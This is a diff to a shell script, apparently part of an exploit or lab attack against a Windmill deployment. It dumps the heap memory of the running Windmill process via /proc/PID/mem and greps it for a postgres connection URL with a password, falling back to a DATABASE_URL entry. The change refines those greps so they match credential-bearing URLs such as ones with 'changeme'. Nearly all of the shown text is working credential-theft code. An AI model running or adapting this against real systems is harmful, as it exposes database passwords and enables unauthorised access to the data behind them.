@@ -58,11 +58,12 @@ echo "  (This may take a few seconds...)"
 # Method 1: Using dd + strings on heap region (MOST RELIABLE)
 # Direct grep/strings on /proc/mem doesn't work - need dd first
 skip_blocks=$((0x$heap_start / 4096))
-extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "postgres://postgres" | head -1)
+# Search for postgres URL containing password (more specific to avoid matching script code)
+extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "postgres://.*changeme\|postgres://.*:.*@" | grep -v "extracted=" | head -1)
 
 if [ -z "$extracted" ]; then
     # Method 2: Search for environment variable format (DATABASE_URL=...)
-    extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "^DATABASE_URL=postgres://" | head -1 | cut -d'=' -f2-)
+    extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "^DATABASE_URL=postgres://" | grep -v "extracted=" | head -1 | cut -d'=' -f2-)
 fi
 
 echo ""
